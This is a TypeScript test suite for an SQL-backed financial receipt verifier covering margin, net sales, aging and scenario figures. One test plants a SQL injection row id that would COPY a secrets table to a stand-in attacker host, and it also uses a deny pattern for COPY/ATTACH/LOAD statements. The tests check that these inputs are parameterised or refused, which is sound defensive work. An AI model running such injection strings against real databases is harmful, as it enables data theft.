import test from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { DatabaseCalculator, type SQLConnection } from '../runtime/analytics.ts';
import type { CalculationReceipt } from '../runtime/calculator.ts';

const definitions = [
  {name:'earned',label:'Earned',meaning:'Goods delivered excluding tax.',kind:'sale',field:'amountMinor',currency:'INR',nulls:'reject'},
  {name:'refunds',label:'Refunds',meaning:'Positive returned goods amounts.',kind:'refund',field:'amountMinor',currency:'INR',nulls:'reject'},
  {name:'costs',label:'Costs',meaning:'Positive imported operating costs.',kind:'cost',field:'amountMinor',currency:'INR',nulls:'reject'},
];
function receipt(operation = 'margin'): CalculationReceipt {
  const rows = [
    {factId:'sale-a',entityId:'a',sourceId:'fixture',sourceRow:2,kind:'sale',amountMinor:'125025',validFrom:'2026-09-03'},
    {factId:'sale-b',entityId:'b',sourceId:'fixture',sourceRow:3,kind:'sale',amountMinor:'79975',validFrom:'2026-09-04'},
    {factId:'refund-a',entityId:'r',sourceId:'fixture',sourceRow:4,kind:'refund',amountMinor:'12500',validFrom:'2026-09-05'},
    {factId:'cost-a',entityId:'c',sourceId:'fixture',sourceRow:5,kind:'cost',amountMinor:'58000',validFrom:'2026-09-06'},
  ];
  const figures = Object.entries({earned:'205000',refunds:'12500',netSales:'192500',costs:'58000',contribution:'134500',marginBps:'6987'}).map(([key,minor]) => ({key,label:key,minor,display:minor,unit:key==='marginBps'?'basis-points':'money',...(key==='marginBps'?{}:{currency:'INR'})}));
  return {id:'independent-sql-receipt',operation,currency:'INR',definitions:structuredClone(definitions),rows,rowIds:rows.map(row=>row.factId),figures,valueMinor:'134500',totalMinor:'134500',period:{from:'2026-09-01',to:'2026-09-30'},comparePeriod:null,assumptions:{}} as CalculationReceipt;
}
function injected(answer: Record<string,unknown>) {
  const calls: {sql:string;parameters:unknown[]}[] = []; let closed = false;
  const connection: SQLConnection = {async execute(sql,parameters=[]) {calls.push({sql,parameters:[...parameters]});return /^(?:WITH|SELECT) /.test(sql)?[answer]:[];},close(){closed=true;}};
  return {database:new DatabaseCalculator({connectionFactory:async()=>connection}),calls,isClosed:()=>closed};
}
const marginAnswer = {earned:'205000',refunds:'12500',netSales:'192500',costs:'58000',contribution:'134500',marginBps:'6987'};

test('injected SQL conformance checks independent margin figures and closes projection; it makes no DuckDB execution claim', async () => {
  const fixture = injected(marginAnswer); const result = await fixture.database.verify(receipt());
  assert.equal(result.verified,true); assert.equal(result.engine,'injected-sql'); assert.equal(fixture.isClosed(),true);
  assert.equal(fixture.calls.filter(call=>call.sql.startsWith('INSERT INTO receipt_rows')).length,4);
  assert.ok(fixture.calls.some(call=>call.sql.includes('DECIMAL(38,0)')));
  assert.ok(fixture.calls.at(-1)!.sql.includes('//'), 'Basis points must avoid floating division.');
});

test('data identities and measure bindings remain prepared parameters, never executable SQL', async () => {
  const input = receipt(); input.rows[0].factId = "'; COPY secrets TO 'https://attacker.invalid';--"; input.rowIds[0]=input.rows[0].factId;
  const fixture = injected(marginAnswer); await fixture.database.verify(input);
  assert.ok(fixture.calls.some(call=>call.parameters.includes(input.rows[0].factId)));
  assert.ok(fixture.calls.every(call=>!call.sql.includes(input.rows[0].factId)));
  assert.ok(fixture.calls.every(call=>!/^\s*(?:COPY|ATTACH|INSTALL|LOAD|EXPORT)/i.test(call.sql)));
});

test('disagreement, missing ratio and floating-point results refuse the whole receipt', async () => {
  for (const answer of [{...marginAnswer,contribution:'134499'}, {...marginAnswer,marginBps:null}, {...marginAnswer,earned:205000}]) {
    const fixture=injected(answer);await assert.rejects(fixture.database.verify(receipt()));assert.equal(fixture.isClosed(),true);
  }
});

test('unregistered queries and malformed projections refuse before opening a database', async () => {
  let opened=0;const database=new DatabaseCalculator({connectionFactory:async()=>{opened++;throw Error('unexpected');}});
  for (const modify of [(r:any)=>r.operation='SELECT secrets', (r:any)=>r.operation='toString', (r:any)=>r.operation='constructor', (r:any)=>r.rows[0].amountMinor='1.25', (r:any)=>r.rows[0].validFrom='2026-02-30', (r:any)=>r.definitions[0].field='eval(raw)', (r:any)=>r.rows[0].status='cancelled']) {const value=receipt();modify(value);await assert.rejects(database.verify(value));}
  assert.equal(opened,0);
});

test('signed published sum, net sales, change and scenario all require their registered exact SQL figures', async () => {
  const sum=receipt();sum.operation='earned';sum.definitions=[{...definitions[0],sign:-1} as any];sum.rows=sum.rows.filter(row=>row.kind==='sale');sum.rowIds=sum.rows.map(row=>row.factId);sum.valueMinor=sum.totalMinor='-205000';sum.figures=[{key:'total',label:'Signed sum',minor:'-205000',display:'-205000',unit:'money',currency:'INR'}];
  const summed=injected({total:'-205000'});await summed.database.verify(sum);assert.ok(summed.calls.some(call=>call.parameters.includes(-1)));
  const net=receipt();net.operation='net_sales';net.definitions=net.definitions.filter(d=>d.name!=='costs');net.rows=net.rows.filter(row=>row.kind!=='cost');net.rowIds=net.rows.map(row=>row.factId);net.valueMinor=net.totalMinor='192500';net.figures=[{key:'total',label:'Net',minor:'192500',display:'192500',unit:'money',currency:'INR'}];await injected({total:'192500'}).database.verify(net);
  const change=structuredClone(sum);change.operation='change';change.definitions[0].sign=1;change.comparePeriod={from:'2026-08-01',to:'2026-08-31'};change.rows.push({...change.rows[0],factId:'prior',amountMinor:'100000',validFrom:'2026-08-15'});change.rowIds=change.rows.map(row=>row.factId);change.valueMinor=change.totalMinor='105000';change.figures=Object.entries({current:'205000',previous:'100000',change:'105000',changeBps:'10500'}).map(([key,minor])=>({key,label:key,minor,display:minor,unit:key==='changeBps'?'basis-points':'money',...(key==='changeBps'?{}:{currency:'INR'})})) as any;
  const changed=injected({current:'205000',previous:'100000',change:'105000',changeBps:'10500'});await changed.database.verify(change);assert.deepEqual(changed.calls.at(-1)!.parameters,['2026-09-01','2026-09-30','2026-08-01','2026-08-31']);
  const scenario=structuredClone(sum);scenario.operation='scenario';scenario.definitions[0].sign=1;scenario.assumptions={priceChangeBps:'1000'};scenario.valueMinor=scenario.totalMinor='225500';scenario.figures=Object.entries({baseline:'205000',scenario:'225500',change:'20500',priceChangeBps:'1000'}).map(([key,minor])=>({key,label:key,minor,display:minor,unit:key==='priceChangeBps'?'basis-points':'money',...(key==='priceChangeBps'?{}:{currency:'INR'})})) as any;
  const simulated=injected({baseline:'205000',scenario:'225500',change:'20500',priceChangeBps:'1000'});await simulated.database.verify(scenario);assert.deepEqual(simulated.calls.at(-1)!.parameters,['1000']);
});

test('aging requires invoice/customer/due-date links and matches outstanding and unallocated figures', async () => {
  const aging=receipt();aging.operation='aging';aging.definitions=[{...definitions[0],name:'billed',kind:'invoice'},{...definitions[0],name:'received',kind:'payment'},definitions[1]] as any;
  aging.rows=[{factId:'invoice',entityId:'i',sourceId:'fixture',sourceRow:2,kind:'invoice',amountMinor:'220000',validFrom:'2026-09-02',dueDate:'2026-09-15',invoiceId:'i',customerId:'c'},{factId:'payment',entityId:'p',sourceId:'fixture',sourceRow:3,kind:'payment',amountMinor:'110000',validFrom:'2026-09-06',invoiceId:'i',customerId:'c'},{factId:'refund',entityId:'r',sourceId:'fixture',sourceRow:4,kind:'refund',amountMinor:'12500',validFrom:'2026-09-05',invoiceId:'i',customerId:'c'}];aging.rowIds=aging.rows.map(row=>row.factId);aging.assumptions={onDate:'2026-09-30'};aging.valueMinor=aging.totalMinor='97500';
  const answer={notDue:'0',days1to30:'97500',days31to60:'0',days61to90:'0',over90:'0',outstanding:'97500',unallocated:'0'};aging.figures=Object.entries(answer).map(([key,minor])=>({key,label:key,minor,display:minor,unit:'money',currency:'INR'}));
  const fixture=injected(answer);await fixture.database.verify(aging);assert.deepEqual(fixture.calls.at(-1)!.parameters,['2026-09-30']);
  delete aging.rows[0].dueDate;await assert.rejects(fixture.database.verify(aging),{code:'SQL_PROJECTION_INVALID'});
});

test('zero denominator omits a ratio and integer projection budgets fail closed', async () => {
  const empty=receipt();empty.rows=[];empty.rowIds=[];empty.valueMinor=empty.totalMinor='0';empty.figures=empty.figures.filter(f=>f.key!=='marginBps').map(f=>({...f,minor:'0',display:'0'}));await injected({earned:'0',refunds:'0',netSales:'0',costs:'0',contribution:'0',marginBps:null}).database.verify(empty);
  const budget=new DatabaseCalculator({maxRows:1,connectionFactory:async()=>{throw Error('must not open');}});await assert.rejects(budget.verify(receipt()),{code:'SQL_ROW_LIMIT'});
});

test('default production worker either performs actual DuckDB conformance or reports its unavailable runtime', async () => {
  let available=false;try{createRequire(import.meta.url).resolve('@duckdb/node-api');available=true;}catch{}
  const database=new DatabaseCalculator();
  if (available) {const result=await database.verify(receipt());assert.equal(result.engine,'duckdb');}
  else await assert.rejects(database.verify(receipt()),{code:'DUCKDB_UNAVAILABLE'});
});
